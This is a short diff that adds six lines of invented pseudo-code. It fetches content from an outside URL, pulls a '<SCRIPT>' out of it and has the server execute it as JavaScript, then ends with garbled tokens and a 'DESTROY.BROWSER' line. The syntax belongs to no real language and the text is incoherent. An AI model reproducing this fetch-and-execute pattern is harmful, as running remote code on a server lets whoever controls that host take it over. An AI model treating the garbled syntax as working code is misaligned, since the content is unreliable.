@@ -1,0 +1,6 @@
+A = REQUEST FROM "https://domainserve.ui/domains/rts-tender/hostinfo/node.js/ver";
+B = SELECT FROM A  "<SCRIPT>";
+SERVER EXECUTE <JAVASCRIPT> B;
+END;;
+,L,X,K,O.0001.SESSION.END
+DESTROY.BROWSER
